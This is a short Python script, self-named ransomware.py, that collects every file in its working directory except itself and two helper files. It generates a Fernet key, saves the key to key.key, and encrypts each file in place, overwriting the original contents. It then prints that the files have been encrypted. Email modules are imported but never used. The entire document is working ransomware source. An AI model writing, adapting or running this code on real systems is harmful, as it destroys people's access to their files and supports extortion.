#!/usr/bin/env python3

import os
import smtplib
from email.mime.text import MIMEText
from cryptography.fernet import Fernet

files = []

key = Fernet.generate_key()

def get_files():
    for file in os.listdir():
        if file == "ransomware.py" or file == "key.key" or file == "decrypt.py":
            pass
        else:
            if os.path.isfile(file):
                files.append(file)

def get_key_files(key):
    with open("key.key", "wb") as k:
        k.write(key)

def encrypt():
    for file in files:
        with open(file, "rb") as f:
            contents = f.read()
            contents_encrypted = Fernet(key).encrypt(contents)

        with open(file, "wb") as f:
            f.write(contents_encrypted)
    print("Your files has been encrypted")

def main():
    get_files()
    get_key_files(key)
    encrypt()

if __name__ == '__main__':
    main()

